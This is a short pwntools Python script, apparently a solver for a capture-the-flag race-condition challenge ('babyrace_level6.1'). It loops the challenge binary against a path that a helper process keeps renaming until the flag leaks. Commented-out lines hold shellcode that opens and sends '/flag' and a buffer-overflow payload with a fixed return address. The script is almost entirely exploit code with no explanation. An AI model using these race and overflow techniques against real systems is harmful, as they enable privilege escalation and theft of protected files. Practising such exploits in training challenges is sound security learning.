from pwn import *

# sc = asm(shellcraft.open("/flag",0) + shellcraft.sendfile(1, "rax", 0, 0x66))

# exp = b"A"*0x198 + 0x4012D6.to_bytes(8, "little")
# with open("b", "wb") as fd:
#     fd.write(exp)

paa = process(["./rename", "aaa", "bbb"], )
while True:
    p = process(["/challenge/babyrace_level6.1", "./aaa/zsh/zshrc"])

    all = p.recvall()
    p.close()
    if all.find(b"pwn") != -1:
        break

